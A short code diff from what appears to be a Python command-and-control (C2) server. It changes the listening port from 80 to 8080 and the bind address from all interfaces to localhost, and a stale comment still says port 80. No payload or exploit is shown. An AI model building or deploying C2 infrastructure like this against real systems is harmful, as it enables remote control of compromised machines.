@@ -33,9 +33,9 @@ def execute_command(command):
     return "Command executed successfully"
 
 def run_c2_server():
-    PORT = 80  # Use the common HTTP port 80
+    PORT = 8080  # Use the common HTTP port 80
     Handler = C2Handler
-    httpd = socketserver.TCPServer(('0.0.0.0', PORT), Handler)
+    httpd = socketserver.TCPServer(('127.0.0.1', PORT), Handler)
     print(f"Listening on port {PORT}")
     httpd.serve_forever()
 
